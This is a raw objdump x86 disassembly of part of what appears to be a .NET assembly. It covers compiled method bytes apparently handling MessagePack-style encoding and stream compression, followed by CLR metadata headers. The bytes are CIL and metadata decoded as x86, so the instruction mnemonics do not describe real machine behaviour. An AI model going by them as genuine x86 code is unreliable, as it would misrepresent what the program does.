  405757:	16                   	push   %ss
  405758:	06                   	push   %es
  405759:	8e 69 6f             	mov    0x6f(%ecx),%gs
  40575c:	4c                   	dec    %esp
  40575d:	00 00                	add    %al,(%eax)
  40575f:	0a 02                	or     (%edx),%al
  405761:	03 16                	add    (%esi),%edx
  405763:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  405769:	00 0a                	add    %cl,(%edx)
  40576b:	2a 13                	sub    (%ebx),%dl
  40576d:	30 04 00             	xor    %al,(%eax,%eax,1)
  405770:	21 00                	and    %eax,(%eax)
  405772:	00 00                	add    %al,(%eax)
  405774:	29 00                	sub    %eax,(%eax)
  405776:	00 11                	add    %dl,(%ecx)
  405778:	02 20                	add    (%eax),%ah
  40577a:	cf                   	iret
  40577b:	00 00                	add    %al,(%eax)
  40577d:	00 6f ee             	add    %ch,-0x12(%edi)
  405780:	00 00                	add    %al,(%eax)
  405782:	0a 03                	or     (%ebx),%al
  405784:	28 09                	sub    %cl,(%ecx)
  405786:	01 00                	add    %eax,(%eax)
  405788:	0a 0a                	or     (%edx),%cl
  40578a:	02 06                	add    (%esi),%al
  40578c:	28 58 00             	sub    %bl,0x0(%eax)
  40578f:	00 06                	add    %al,(%esi)
  405791:	16                   	push   %ss
  405792:	1e                   	push   %ds
  405793:	6f                   	outsl  %ds:(%esi),(%dx)
  405794:	4c                   	dec    %esp
  405795:	00 00                	add    %al,(%eax)
  405797:	0a 2a                	or     (%edx),%ch
  405799:	00 00                	add    %al,(%eax)
  40579b:	00 13                	add    %dl,(%ebx)
  40579d:	30 04 00             	xor    %al,(%eax,%eax,1)
  4057a0:	35 01 00 00 00       	xor    $0x1,%eax
  4057a5:	00 00                	add    %al,(%eax)
  4057a7:	00 03                	add    %al,(%ebx)
  4057a9:	16                   	push   %ss
  4057aa:	6a 3f                	push   $0x3f
  4057ac:	96                   	xchg   %eax,%esi
  4057ad:	00 00                	add    %al,(%eax)
  4057af:	00 03                	add    %al,(%ebx)
  4057b1:	1f                   	pop    %ds
  4057b2:	7f 6a                	jg     0x40581e
  4057b4:	3d 09 00 00 00       	cmp    $0x9,%eax
  4057b9:	02 03                	add    (%ebx),%al
  4057bb:	d2 6f ee             	shrb   %cl,-0x12(%edi)
  4057be:	00 00                	add    %al,(%eax)
  4057c0:	0a 2a                	or     (%edx),%ch
  4057c2:	03 20                	add    (%eax),%esp
  4057c4:	ff 00                	incl   (%eax)
  4057c6:	00 00                	add    %al,(%eax)
  4057c8:	6a 3d                	push   $0x3d
  4057ca:	14 00                	adc    $0x0,%al
  4057cc:	00 00                	add    %al,(%eax)
  4057ce:	02 20                	add    (%eax),%ah
  4057d0:	cc                   	int3
  4057d1:	00 00                	add    %al,(%eax)
  4057d3:	00 6f ee             	add    %ch,-0x12(%edi)
  4057d6:	00 00                	add    %al,(%eax)
  4057d8:	0a 02                	or     (%edx),%al
  4057da:	03 d2                	add    %edx,%edx
  4057dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4057dd:	ee                   	out    %al,(%dx)
  4057de:	00 00                	add    %al,(%eax)
  4057e0:	0a 2a                	or     (%edx),%ch
  4057e2:	03 20                	add    (%eax),%esp
  4057e4:	ff                   	(bad)
  4057e5:	ff 00                	incl   (%eax)
  4057e7:	00 6a 3d             	add    %ch,0x3d(%edx)
  4057ea:	1b 00                	sbb    (%eax),%eax
  4057ec:	00 00                	add    %al,(%eax)
  4057ee:	02 20                	add    (%eax),%ah
  4057f0:	cd 00                	int    $0x0
  4057f2:	00 00                	add    %al,(%eax)
  4057f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4057f5:	ee                   	out    %al,(%dx)
  4057f6:	00 00                	add    %al,(%eax)
  4057f8:	0a 02                	or     (%edx),%al
  4057fa:	03 68 28             	add    0x28(%eax),%ebp
  4057fd:	5b                   	pop    %ebx
  4057fe:	00 00                	add    %al,(%eax)
  405800:	06                   	push   %es
  405801:	16                   	push   %ss
  405802:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  405805:	00 00                	add    %al,(%eax)
  405807:	0a 2a                	or     (%edx),%ch
  405809:	03 15 6e 3d 1b 00    	add    0x1b3d6e,%edx
  40580f:	00 00                	add    %al,(%eax)
  405811:	02 20                	add    (%eax),%ah
  405813:	ce                   	into
  405814:	00 00                	add    %al,(%eax)
  405816:	00 6f ee             	add    %ch,-0x12(%edi)
  405819:	00 00                	add    %al,(%eax)
  40581b:	0a 02                	or     (%edx),%al
  40581d:	03 69 28             	add    0x28(%ecx),%ebp
  405820:	5a                   	pop    %edx
  405821:	00 00                	add    %al,(%eax)
  405823:	06                   	push   %es
  405824:	16                   	push   %ss
  405825:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  405828:	00 00                	add    %al,(%eax)
  40582a:	0a 2a                	or     (%edx),%ch
  40582c:	02 20                	add    (%eax),%ah
  40582e:	d3 00                	roll   %cl,(%eax)
  405830:	00 00                	add    %al,(%eax)
  405832:	6f                   	outsl  %ds:(%esi),(%dx)
  405833:	ee                   	out    %al,(%dx)
  405834:	00 00                	add    %al,(%eax)
  405836:	0a 02                	or     (%edx),%al
  405838:	03 28                	add    (%eax),%ebp
  40583a:	59                   	pop    %ecx
  40583b:	00 00                	add    %al,(%eax)
  40583d:	06                   	push   %es
  40583e:	16                   	push   %ss
  40583f:	1e                   	push   %ds
  405840:	6f                   	outsl  %ds:(%esi),(%dx)
  405841:	4c                   	dec    %esp
  405842:	00 00                	add    %al,(%eax)
  405844:	0a 2a                	or     (%edx),%ch
  405846:	03 20                	add    (%eax),%esp
  405848:	00 00                	add    %al,(%eax)
  40584a:	00 80 6a 3d 1a 00    	add    %al,0x1a3d6a(%eax)
  405850:	00 00                	add    %al,(%eax)
  405852:	02 20                	add    (%eax),%ah
  405854:	d3 00                	roll   %cl,(%eax)
  405856:	00 00                	add    %al,(%eax)
  405858:	6f                   	outsl  %ds:(%esi),(%dx)
  405859:	ee                   	out    %al,(%dx)
  40585a:	00 00                	add    %al,(%eax)
  40585c:	0a 02                	or     (%edx),%al
  40585e:	03 28                	add    (%eax),%ebp
  405860:	59                   	pop    %ecx
  405861:	00 00                	add    %al,(%eax)
  405863:	06                   	push   %es
  405864:	16                   	push   %ss
  405865:	1e                   	push   %ds
  405866:	6f                   	outsl  %ds:(%esi),(%dx)
  405867:	4c                   	dec    %esp
  405868:	00 00                	add    %al,(%eax)
  40586a:	0a 2a                	or     (%edx),%ch
  40586c:	03 20                	add    (%eax),%esp
  40586e:	00 80 ff ff 6a 3d    	add    %al,0x3d6affff(%eax)
  405874:	1b 00                	sbb    (%eax),%eax
  405876:	00 00                	add    %al,(%eax)
  405878:	02 20                	add    (%eax),%ah
  40587a:	d2 00                	rolb   %cl,(%eax)
  40587c:	00 00                	add    %al,(%eax)
  40587e:	6f                   	outsl  %ds:(%esi),(%dx)
  40587f:	ee                   	out    %al,(%dx)
  405880:	00 00                	add    %al,(%eax)
  405882:	0a 02                	or     (%edx),%al
  405884:	03 69 28             	add    0x28(%ecx),%ebp
  405887:	5a                   	pop    %edx
  405888:	00 00                	add    %al,(%eax)
  40588a:	06                   	push   %es
  40588b:	16                   	push   %ss
  40588c:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  40588f:	00 00                	add    %al,(%eax)
  405891:	0a 2a                	or     (%edx),%ch
  405893:	03 1f                	add    (%edi),%ebx
  405895:	80 6a 3d 1b          	subb   $0x1b,0x3d(%edx)
  405899:	00 00                	add    %al,(%eax)
  40589b:	00 02                	add    %al,(%edx)
  40589d:	20 d1                	and    %dl,%cl
  40589f:	00 00                	add    %al,(%eax)
  4058a1:	00 6f ee             	add    %ch,-0x12(%edi)
  4058a4:	00 00                	add    %al,(%eax)
  4058a6:	0a 02                	or     (%edx),%al
  4058a8:	03 68 28             	add    0x28(%eax),%ebp
  4058ab:	5b                   	pop    %ebx
  4058ac:	00 00                	add    %al,(%eax)
  4058ae:	06                   	push   %es
  4058af:	16                   	push   %ss
  4058b0:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  4058b3:	00 00                	add    %al,(%eax)
  4058b5:	0a 2a                	or     (%edx),%ch
  4058b7:	03 1f                	add    (%edi),%ebx
  4058b9:	e0 6a                	loopne 0x405925
  4058bb:	3d 14 00 00 00       	cmp    $0x14,%eax
  4058c0:	02 20                	add    (%eax),%ah
  4058c2:	d0 00                	rolb   $1,(%eax)
  4058c4:	00 00                	add    %al,(%eax)
  4058c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4058c7:	ee                   	out    %al,(%dx)
  4058c8:	00 00                	add    %al,(%eax)
  4058ca:	0a 02                	or     (%edx),%al
  4058cc:	03 d2                	add    %edx,%edx
  4058ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4058cf:	ee                   	out    %al,(%dx)
  4058d0:	00 00                	add    %al,(%eax)
  4058d2:	0a 2a                	or     (%edx),%ch
  4058d4:	02 03                	add    (%ebx),%al
  4058d6:	d2 6f ee             	shrb   %cl,-0x12(%edi)
  4058d9:	00 00                	add    %al,(%eax)
  4058db:	0a 2a                	or     (%edx),%ch
  4058dd:	00 00                	add    %al,(%eax)
  4058df:	00 1b                	add    %bl,(%ebx)
  4058e1:	30 04 00             	xor    %al,(%eax,%eax,1)
  4058e4:	61                   	popa
  4058e5:	00 00                	add    %al,(%eax)
  4058e7:	00 2d 00 00 11 02    	add    %ch,0x2110000
  4058ed:	73 4d                	jae    0x40593c
  4058ef:	00 00                	add    %al,(%eax)
  4058f1:	0a 0a                	or     (%edx),%cl
  4058f3:	1a 8d 44 00 00 01    	sbb    0x1000044(%ebp),%cl
  4058f9:	0b 06                	or     (%esi),%eax
  4058fb:	07                   	pop    %es
  4058fc:	16                   	push   %ss
  4058fd:	1a 6f 45             	sbb    0x45(%edi),%ch
  405900:	00 00                	add    %al,(%eax)
  405902:	0a 26                	or     (%esi),%ah
  405904:	07                   	pop    %es
  405905:	16                   	push   %ss
  405906:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  40590a:	0a 0c 06             	or     (%esi,%eax,1),%cl
  40590d:	16                   	push   %ss
  40590e:	73 0a                	jae    0x40591a
  405910:	01 00                	add    %eax,(%eax)
  405912:	0a 0d 08 8d 44 00    	or     0x448d08,%cl
  405918:	00 01                	add    %al,(%ecx)
  40591a:	13 04 09             	adc    (%ecx,%ecx,1),%eax
  40591d:	11 04 16             	adc    %eax,(%esi,%edx,1)
  405920:	08 6f 45             	or     %ch,0x45(%edi)
  405923:	00 00                	add    %al,(%eax)
  405925:	0a 26                	or     (%esi),%ah
  405927:	11 04 13             	adc    %eax,(%ebx,%edx,1)
  40592a:	05 dd 1a 00 00       	add    $0x1add,%eax
  40592f:	00 09                	add    %cl,(%ecx)
  405931:	39 06                	cmp    %eax,(%esi)
  405933:	00 00                	add    %al,(%eax)
  405935:	00 09                	add    %cl,(%ecx)
  405937:	6f                   	outsl  %ds:(%esi),(%dx)
  405938:	33 00                	xor    (%eax),%eax
  40593a:	00 0a                	add    %cl,(%edx)
  40593c:	dc 06                	faddl  (%esi)
  40593e:	39 06                	cmp    %eax,(%esi)
  405940:	00 00                	add    %al,(%eax)
  405942:	00 06                	add    %al,(%esi)
  405944:	6f                   	outsl  %ds:(%esi),(%dx)
  405945:	33 00                	xor    (%eax),%eax
  405947:	00 0a                	add    %cl,(%edx)
  405949:	dc 11                	fcoml  (%ecx)
  40594b:	05 2a 00 00 00       	add    $0x2a,%eax
  405950:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  405953:	00 02                	add    %al,(%edx)
  405955:	00 28                	add    %ch,(%eax)
  405957:	00 1c 44             	add    %bl,(%esp,%eax,2)
  40595a:	00 0d 00 00 00 00    	add    %cl,0x0
  405960:	02 00                	add    (%eax),%al
  405962:	07                   	pop    %es
  405963:	00 4a 51             	add    %cl,0x51(%edx)
  405966:	00 0d 00 00 00 00    	add    %cl,0x0
  40596c:	1b 30                	sbb    (%eax),%esi
  40596e:	04 00                	add    $0x0,%al
  405970:	5e                   	pop    %esi
  405971:	00 00                	add    %al,(%eax)
  405973:	00 2e                	add    %ch,(%esi)
  405975:	00 00                	add    %al,(%eax)
  405977:	11 73 d0             	adc    %esi,-0x30(%ebx)
  40597a:	00 00                	add    %al,(%eax)
  40597c:	0a 0a                	or     (%edx),%cl
  40597e:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  405984:	00 0a                	add    %cl,(%edx)
  405986:	0b 06                	or     (%esi),%eax
  405988:	07                   	pop    %es
  405989:	16                   	push   %ss
  40598a:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  40598d:	00 00                	add    %al,(%eax)
  40598f:	0a 06                	or     (%esi),%al
  405991:	17                   	pop    %ss
  405992:	73 0a                	jae    0x40599e
  405994:	01 00                	add    %eax,(%eax)
  405996:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  405999:	02 16                	add    (%esi),%dl
  40599b:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  4059a1:	00 0a                	add    %cl,(%edx)
  4059a3:	08 6f 4f             	or     %ch,0x4f(%edi)
  4059a6:	00 00                	add    %al,(%eax)
  4059a8:	0a dd                	or     %ch,%bl
  4059aa:	0d 00 00 00 08       	or     $0x8000000,%eax
  4059af:	39 06                	cmp    %eax,(%esi)
  4059b1:	00 00                	add    %al,(%eax)
  4059b3:	00 08                	add    %cl,(%eax)
  4059b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4059b6:	33 00                	xor    (%eax),%eax
  4059b8:	00 0a                	add    %cl,(%edx)
  4059ba:	dc 06                	faddl  (%esi)
  4059bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4059bd:	dd 00                	fldl   (%eax)
  4059bf:	00 0a                	add    %cl,(%edx)
  4059c1:	0d dd 0d 00 00       	or     $0xddd,%eax
  4059c6:	00 06                	add    %al,(%esi)
  4059c8:	39 06                	cmp    %eax,(%esi)
  4059ca:	00 00                	add    %al,(%eax)
  4059cc:	00 06                	add    %al,(%esi)
  4059ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4059cf:	33 00                	xor    (%eax),%eax
  4059d1:	00 0a                	add    %cl,(%edx)
  4059d3:	dc 09                	fmull  (%ecx)
  4059d5:	2a 00                	sub    (%eax),%al
  4059d7:	00 01                	add    %al,(%ecx)
  4059d9:	1c 00                	sbb    $0x0,%al
  4059db:	00 02                	add    %al,(%edx)
  4059dd:	00 20                	add    %ah,(%eax)
  4059df:	00 16                	add    %dl,(%esi)
  4059e1:	36 00 0d 00 00 00 00 	add    %cl,%ss:0x0
  4059e8:	02 00                	add    (%eax),%al
  4059ea:	06                   	push   %es
  4059eb:	00 49 4f             	add    %cl,0x4f(%ecx)
  4059ee:	00 0d 00 00 00 00    	add    %cl,0x0
  4059f4:	42                   	inc    %edx
  4059f5:	53                   	push   %ebx
  4059f6:	4a                   	dec    %edx
  4059f7:	42                   	inc    %edx
  4059f8:	01 00                	add    %eax,(%eax)
  4059fa:	01 00                	add    %eax,(%eax)
  4059fc:	00 00                	add    %al,(%eax)
  4059fe:	00 00                	add    %al,(%eax)
  405a00:	0c 00                	or     $0x0,%al
  405a02:	00 00                	add    %al,(%eax)
  405a04:	76 34                	jbe    0x405a3a
  405a06:	2e 30 2e             	xor    %ch,%cs:(%esi)
  405a09:	33 30                	xor    (%eax),%esi
  405a0b:	33 31                	xor    (%ecx),%esi
  405a0d:	39 00                	cmp    %eax,(%eax)
  405a0f:	00 00                	add    %al,(%eax)
  405a11:	00 05 00 6c 00 00    	add    %al,0x6c00
  405a17:	00 bc 1d 00 00 23 7e 	add    %bh,0x7e230000(%ebp,%ebx,1)
  405a1e:	00 00                	add    %al,(%eax)
  405a20:	28 1e                	sub    %bl,(%esi)
  405a22:	00 00                	add    %al,(%eax)
  405a24:	bc 1d 00 00 23       	mov    $0x2300001d,%esp
  405a29:	53                   	push   %ebx
  405a2a:	74 72                	je     0x405a9e
  405a2c:	69 6e 67 73 00 00 00 	imul   $0x73,0x67(%esi),%ebp
  405a33:	00 e4                	add    %ah,%ah
  405a35:	3b 00                	cmp    (%eax),%eax
  405a37:	00 cc                	add    %cl,%ah
  405a39:	27                   	daa
  405a3a:	00 00                	add    %al,(%eax)
  405a3c:	23 55 53             	and    0x53(%ebp),%edx
  405a3f:	00 b0 63 00 00 10    	add    %dh,0x10000063(%eax)
  405a45:	00 00                	add    %al,(%eax)
  405a47:	00 23                	add    %ah,(%ebx)
  405a49:	47                   	inc    %edi
  405a4a:	55                   	push   %ebp
  405a4b:	49                   	dec    %ecx
  405a4c:	44                   	inc    %esp
  405a4d:	00 00                	add    %al,(%eax)
  405a4f:	00 c0                	add    %al,%al
  405a51:	63 00                	arpl   %eax,(%eax)
  405a53:	00 40 09             	add    %al,0x9(%eax)
  405a56:	00 00                	add    %al,(%eax)
  405a58:	23 42 6c             	and    0x6c(%edx),%eax
  405a5b:	6f                   	outsl  %ds:(%esi),(%dx)
  405a5c:	62 00                	bound  %eax,(%eax)
  405a5e:	00 00                	add    %al,(%eax)
  405a60:	00 00                	add    %al,(%eax)
  405a62:	00 00                	add    %al,(%eax)
  405a64:	02 00                	add    (%eax),%al
  405a66:	00 00                	add    %al,(%eax)
  405a68:	57                   	push   %edi
  405a69:	9f                   	lahf
  405a6a:	a2 3f 09 0a 00       	mov    %al,0xa093f
  405a6f:	00 00                	add    %al,(%eax)
  405a71:	fa                   	cli
  405a72:	25 33 00 16 00       	and    $0x160033,%eax
  405a77:	00 01                	add    %al,(%ecx)
  405a79:	00 00                	add    %al,(%eax)
  405a7b:	00 9b 00 00 00 1e    	add    %bl,0x1e000000(%ebx)
  405a81:	00 00                	add    %al,(%eax)
  405a83:	00 47 00             	add    %al,0x0(%edi)
  405a86:	00 00                	add    %al,(%eax)
  405a88:	a3 00 00 00 71       	mov    %eax,0x71000000
  405a8d:	00 00                	add    %al,(%eax)
  405a8f:	00 02                	add    %al,(%edx)
  405a91:	00 00                	add    %al,(%eax)
  405a93:	00 0a                	add    %cl,(%edx)
  405a95:	01 00                	add    %eax,(%eax)
  405a97:	00 13                	add    %dl,(%ebx)
  405a99:	00 00                	add    %al,(%eax)
  405a9b:	00 31                	add    %dh,(%ecx)
  405a9d:	00 00                	add    %al,(%eax)
  405a9f:	00 02                	add    %al,(%edx)
  405aa1:	00 00                	add    %al,(%eax)
  405aa3:	00 2e                	add    %ch,(%esi)
  405aa5:	00 00                	add    %al,(%eax)
  405aa7:	00 04 00             	add    %al,(%eax,%eax,1)
  405aaa:	00 00                	add    %al,(%eax)
  405aac:	13 00                	adc    (%eax),%eax
  405aae:	00 00                	add    %al,(%eax)
  405ab0:	20 00                	and    %al,(%eax)
  405ab2:	00 00                	add    %al,(%eax)
  405ab4:	04 00                	add    $0x0,%al
  405ab6:	00 00                	add    %al,(%eax)
  405ab8:	03 00                	add    (%eax),%eax
  405aba:	00 00                	add    %al,(%eax)
  405abc:	06                   	push   %es
  405abd:	00 00                	add    %al,(%eax)
  405abf:	00 06                	add    %al,(%esi)
  405ac1:	00 00                	add    %al,(%eax)
  405ac3:	00 02                	add    %al,(%edx)
  405ac5:	00 00                	add    %al,(%eax)
  405ac7:	00 01                	add    %al,(%ecx)
  405ac9:	00 00                	add    %al,(%eax)
  405acb:	00 08                	add    %cl,(%eax)
  405acd:	00 00                	add    %al,(%eax)
  405acf:	00 04 00             	add    %al,(%eax,%eax,1)
  405ad2:	00 00                	add    %al,(%eax)
  405ad4:	01 00                	add    %eax,(%eax)
  405ad6:	00 00                	add    %al,(%eax)
  405ad8:	00 00                	add    %al,(%eax)
  405ada:	f2 0a 01             	repnz or (%ecx),%al
  405add:	00 00                	add    %al,(%eax)
  405adf:	00 00                	add    %al,(%eax)
  405ae1:	00 06                	add    %al,(%esi)
  405ae3:	00 3d 19 f2 0f 0a    	add    %bh,0xa0ff219
  405ae9:	00 8a 00 07 16 0a    	add    %cl,0xa160700(%edx)
  405aef:	00 a3 19 76 18 0a    	add    %ah,0xa187619(%ebx)
  405af5:	00 8d 0f 89 1d 06    	add    %cl,0x61d890f(%ebp)
  405afb:	00 2d 14 9c 0b 06    	add    %ch,0x60b9c14
  405b01:	00 85 08 07 16 0a    	add    %al,0xa160708(%ebp)
  405b07:	00 a6 10 07 16 0a    	add    %ah,0xa160710(%esi)
  405b0d:	00 12                	add    %dl,(%edx)
  405b0f:	18 89 1d 06 00 fd    	sbb    %cl,-0x2fff9e3(%ecx)
  405b15:	19 f2                	sbb    %esi,%edx
  405b17:	0f 0e                	femms
  405b19:	00 09                	add    %cl,(%ecx)
  405b1b:	12 f3                	adc    %bl,%dh
  405b1d:	0b 0e                	or     (%esi),%ecx
  405b1f:	00 c8                	add    %cl,%al
  405b21:	18 f3                	sbb    %dh,%bl
  405b23:	0b 06                	or     (%esi),%eax
  405b25:	00 42 1c             	add    %al,0x1c(%edx)
  405b28:	9c                   	pushf
  405b29:	0b 06                	or     (%esi),%eax
  405b2b:	00 2d 13 e3 1b 06    	add    %ch,0x61be313
  405b31:	00 63 10             	add    %ah,0x10(%ebx)
  405b34:	f2 0f 0a             	repnz (bad)
  405b37:	00 1e                	add    %bl,(%esi)
  405b39:	17                   	pop    %ss
  405b3a:	55                   	push   %ebp
  405b3b:	00 06                	add    %al,(%esi)
  405b3d:	00 2b                	add    %ch,(%ebx)
  405b3f:	00 c9                	add    %cl,%cl
  405b41:	02 12                	add    (%edx),%dl
  405b43:	00 20                	add    %ah,(%eax)
  405b45:	00 9f 15 12 00 01    	add    %bl,0x1001215(%edi)
  405b4b:	00 f2                	add    %dh,%dl
  405b4d:	0f 12 00             	movlps (%eax),%xmm0
  405b50:	e1 08                	loope  0x405b5a
  405b52:	9f                   	lahf
  405b53:	15 06 00 00 08       	adc    $0x8000006,%eax
  405b58:	f2 0f 06             	repnz clts
  405b5b:	00 e6                	add    %ah,%dh
  405b5d:	0b e3                	or     %ebx,%esp
  405b5f:	1b 06                	sbb    (%esi),%eax
  405b61:	00 a7 14 cc 17 06    	add    %ah,0x617cc14(%edi)
  405b67:	00 a4 05 cc 17 06 00 	add    %ah,0x617cc(%ebp,%eax,1)
  405b6e:	c6                   	(bad)
  405b6f:	0f 5c 02             	subps  (%edx),%xmm0
  405b72:	06                   	push   %es
  405b73:	00 ee                	add    %ch,%dh
  405b75:	09 9f 15 06 00 5b    	or     %ebx,0x5b000615(%edi)
  405b7b:	0a 9f 15 06 00 0b    	or     0xb000615(%edi),%bl
  405b81:	09 41 15             	or     %eax,0x15(%ecx)
  405b84:	6f                   	outsl  %ds:(%esi),(%dx)
  405b85:	00 bf 15 00 00 06    	add    %bh,0x6000015(%edi)
  405b8b:	00 33                	add    %dh,(%ebx)
  405b8d:	09 53 11             	or     %edx,0x11(%ebx)
  405b90:	06                   	push   %es
  405b91:	00 ba 09 53 11 06    	add    %bh,0x6115309(%edx)
  405b97:	00 9b 09 53 11 06    	add    %bl,0x6115309(%ebx)
  405b9d:	00 42 0a             	add    %al,0xa(%edx)
  405ba0:	53                   	push   %ebx
  405ba1:	11 06                	adc    %eax,(%esi)
  405ba3:	00 0e                	add    %cl,(%esi)
  405ba5:	0a 53 11             	or     0x11(%ebx),%dl
  405ba8:	06                   	push   %es
  405ba9:	00 27                	add    %ah,(%edi)
  405bab:	0a 53 11             	or     0x11(%ebx),%dl
  405bae:	06                   	push   %es
  405baf:	00 4a 09             	add    %cl,0x9(%edx)
  405bb2:	53                   	push   %ebx
  405bb3:	11 06                	adc    %eax,(%esi)
  405bb5:	00 7e 09             	add    %bh,0x9(%esi)
  405bb8:	53                   	push   %ebx
  405bb9:	11 06                	adc    %eax,(%esi)
  405bbb:	00 65 09             	add    %ah,0x9(%ebp)
  405bbe:	0a 0c 06             	or     (%esi,%eax,1),%cl
  405bc1:	00 1f                	add    %bl,(%edi)
  405bc3:	09 80 15 06 00 f0    	or     %eax,-0xffff9eb(%eax)
  405bc9:	08 9f 15 06 00 d7    	or     %bl,-0x28fff9eb(%edi)
  405bcf:	09 53 11             	or     %edx,0x11(%ebx)
  405bd2:	06                   	push   %es
  405bd3:	00 19                	add    %bl,(%ecx)
  405bd5:	03 9c 0b 06 00 9d 1b 	add    0x1b9d0006(%ebx,%ecx,1),%ebx
  405bdc:	f2 0f 06             	repnz clts
  405bdf:	00 95 1a f2 0f 06    	add    %dl,0x60ff21a(%ebp)
  405be5:	00 ea                	add    %ch,%dl
  405be7:	0b e3                	or     %ebx,%esp
  405be9:	1b 0a                	sbb    (%edx),%ecx
  405beb:	00 ce                	add    %cl,%dh
  405bed:	1c 07                	sbb    $0x7,%al
  405bef:	16                   	push   %ss
  405bf0:	06                   	push   %es
  405bf1:	00 1d 10 fc 1c 06    	add    %bl,0x61cfc10
  405bf7:	00 fb                	add    %bh,%bl
  405bf9:	12 fc                	adc    %ah,%bh
  405bfb:	1c 06                	sbb    $0x6,%al
  405bfd:	00 7d 0b             	add    %bh,0xb(%ebp)
  405c00:	fc                   	cld
  405c01:	1c 06                	sbb    $0x6,%al
  405c03:	00 f7                	add    %dh,%bh
  405c05:	11 f2                	adc    %esi,%edx
  405c07:	0f 0a                	(bad)
  405c09:	00 58 18             	add    %bl,0x18(%eax)
  405c0c:	62 19                	bound  %ebx,(%ecx)
  405c0e:	0a 00                	or     (%eax),%al
  405c10:	1b 1a                	sbb    (%edx),%ebx
  405c12:	62 19                	bound  %ebx,(%ecx)
  405c14:	0a 00                	or     (%eax),%al
  405c16:	aa                   	stos   %al,%es:(%edi)
  405c17:	0e                   	push   %cs
  405c18:	62 19                	bound  %ebx,(%ecx)
  405c1a:	0a 00                	or     (%eax),%al
  405c1c:	22 1d 76 18 0a 00    	and    0xa1876,%bl
  405c22:	35 08 76 18 0a       	xor    $0xa187608,%eax
  405c27:	00 20                	add    %ah,(%eax)
  405c29:	08 76 18             	or     %dh,0x18(%esi)
  405c2c:	06                   	push   %es
  405c2d:	00 c7                	add    %al,%bh
  405c2f:	0c f2                	or     $0xf2,%al
  405c31:	0f 06                	clts
  405c33:	00 d0                	add    %dl,%al
  405c35:	12 f2                	adc    %dl,%dh
  405c37:	0f 06                	clts
  405c39:	00 44 10 f2          	add    %al,-0xe(%eax,%edx,1)
  405c3d:	0f 0a                	(bad)
  405c3f:	00 bf 17 62 19 0a    	add    %bh,0xa196217(%edi)
  405c45:	00 59 17             	add    %bl,0x17(%ecx)
  405c48:	62 19                	bound  %ebx,(%ecx)
  405c4a:	06                   	push   %es
  405c4b:	00 df                	add    %bl,%bh
  405c4d:	17                   	pop    %ss
  405c4e:	f2 0f 06             	repnz clts
  405c51:	00 b0 05 f2 0f 0a    	add    %dh,0xa0ff205(%eax)
  405c57:	00 7f 0f             	add    %bh,0xf(%edi)
  405c5a:	76 18                	jbe    0x405c74
  405c5c:	0a 00                	or     (%eax),%al
  405c5e:	f4                   	hlt
  405c5f:	0d 89 1d 0a 00       	or     $0xa1d89,%eax
  405c64:	3c 1b                	cmp    $0x1b,%al
  405c66:	62 19                	bound  %ebx,(%ecx)
  405c68:	0a 00                	or     (%eax),%al
  405c6a:	65 11 07             	adc    %eax,%gs:(%edi)
  405c6d:	16                   	push   %ss
  405c6e:	0a 00                	or     (%eax),%al
  405c70:	7d 17                	jge    0x405c89
  405c72:	34 11                	xor    $0x11,%al
  405c74:	06                   	push   %es
  405c75:	00 9b 0a f2 0f 06    	add    %bl,0x60ff20a(%ebx)
  405c7b:	00 18                	add    %bl,(%eax)
  405c7d:	0e                   	push   %cs
  405c7e:	9c                   	pushf
  405c7f:	0b 06                	or     (%esi),%eax
  405c81:	00 e6                	add    %ah,%dh
  405c83:	0d f2 0f 0a 00       	or     $0xa0ff2,%eax
  405c88:	a3 0d f2 0f 0a       	mov    %eax,0xa0ff20d
  405c8d:	00 ec                	add    %ch,%ah
  405c8f:	07                   	pop    %es
  405c90:	f2 0f 06             	repnz clts
  405c93:	00 8c 14 f2 0f 06 00 	add    %cl,0x60ff2(%esp,%edx,1)
  405c9a:	84 1b                	test   %bl,(%ebx)
  405c9c:	9c                   	pushf
  405c9d:	0b 06                	or     (%esi),%eax
  405c9f:	00 c0                	add    %al,%al
  405ca1:	0f 5c 02             	subps  (%edx),%xmm0
  405ca4:	06                   	push   %es
  405ca5:	00 12                	add    %dl,(%edx)
  405ca7:	15 9c 0b 0a 00       	adc    $0xa0b9c,%eax
  405cac:	5a                   	pop    %edx
  405cad:	05 76 18 06 00       	add    $0x61876,%eax
  405cb2:	b8 01 f2 0f 06       	mov    $0x60ff201,%eax
  405cb7:	00 21                	add    %ah,(%ecx)
  405cb9:	12 5c 02 0a          	adc    0xa(%edx,%eax,1),%bl
  405cbd:	00 50 18             	add    %dl,0x18(%eax)
  405cc0:	41                   	inc    %ecx
  405cc1:	15 0a 00 63 12       	adc    $0x1263000a,%eax
  405cc6:	41                   	inc    %ecx
  405cc7:	15 06 00 eb 1c       	adc    $0x1ceb0006,%eax
  405ccc:	55                   	push   %ebp
  405ccd:	00 06                	add    %al,(%esi)
  405ccf:	00 6e 14             	add    %ch,0x14(%esi)
  405cd2:	5c                   	pop    %esp
  405cd3:	02 06                	add    (%esi),%al
  405cd5:	00 66 0d             	add    %ah,0xd(%esi)
  405cd8:	5c                   	pop    %esp
  405cd9:	02 0a                	add    (%edx),%cl
  405cdb:	00 b9 06 41 15 06    	add    %bh,0x6154106(%ecx)
  405ce1:	00 34 12             	add    %dh,(%edx,%edx,1)
  405ce4:	5c                   	pop    %esp
  405ce5:	02 0a                	add    (%edx),%cl
  405ce7:	00 d7                	add    %dl,%bh
  405ce9:	06                   	push   %es
  405cea:	41                   	inc    %ecx
  405ceb:	15 06 00 66 1d       	adc    $0x1d660006,%eax
  405cf0:	55                   	push   %ebp
